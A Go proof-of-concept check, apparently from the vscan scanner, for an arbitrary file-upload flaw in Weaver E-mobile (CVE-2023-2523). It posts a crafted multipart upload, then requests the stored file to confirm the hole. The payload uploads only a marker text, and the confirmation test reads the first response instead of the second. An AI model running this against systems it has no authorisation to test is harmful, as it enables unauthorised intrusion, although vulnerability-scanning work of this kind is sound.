package weaver

import (
	"encoding/json"
	"fmt"
	"github.com/veo/vscan/pkg"
	"regexp"
	"strings"
)

func CVE_20223_2523(u string) bool {

	var payload = "------WebKitFormBoundarydRVCGWq4Cx3Sq6tt\r\nContent-Disposition: form-data; name=\"upload_quwan\"; filename=\"GWq4Cx3Sq6tt.txt.\"\r\nContent-Type: image/jpeg\r\n \r\n1ZCUAAAXxnYuVIZR\r\n------WebKitFormBoundarydRVCGWq4Cx3Sq6tt\r\nContent-Disposition: form-data; name=\"file\"; filename=\"\"\r\nContent-Type: application/octet-stream\r\n \r\n \r\n------WebKitFormBoundarydRVCGWq4Cx3Sq6tt--\r\n"
	header := make(map[string]string)
	header["Content-Type"] = "multipart/form-data; boundary=----WebKitFormBoundarydRVCGWq4Cx3Sq6tt"

	if req, err := pkg.HttpRequset(u+"/E-mobile/App/Ajax/ajax.php?action=mobile_upload_save", "POST", payload, false, header); err == nil {
		//pkg.GoPocLog(req.Body)
		if req.StatusCode == 200 {
			body := req.Body
			var pattern = `attachment`
			re := regexp.MustCompile(pattern)
			resourceUuid := re.FindStringSubmatch(body)
			//pkg.GoPocLog(fmt.Sprintf("正则匹配内容:%s,长度为：%d\n", resourceUuid, len(resourceUuid)))
			if len(resourceUuid) >= 1 {
				result := string(body)
				var arr []interface{}
				if err := json.Unmarshal([]byte(result), &arr); err != nil {
					panic(err)
				}
				id, _ := arr[2].(float64)
				filename, _ := arr[3].(string)
				shellUrl := "/attachment/" + fmt.Sprintf("%.0f", id) + "/" + filename
				if req2, err := pkg.HttpRequset(u+shellUrl, "GET", "", false, nil); err == nil {
					if req2.StatusCode == 200 && strings.Contains(req.Body, "1ZCUAAAXxnYuVIZR") {
						pkg.GoPocLog(fmt.Sprintf("Found vuln weaver_CVE_2023_2523|%s|参考链接：https://blog.csdn.net/qq_41904294/article/details/130832416\n", u+shellUrl))
						return true
					}
				}
			}
		}
	}
	return false
}
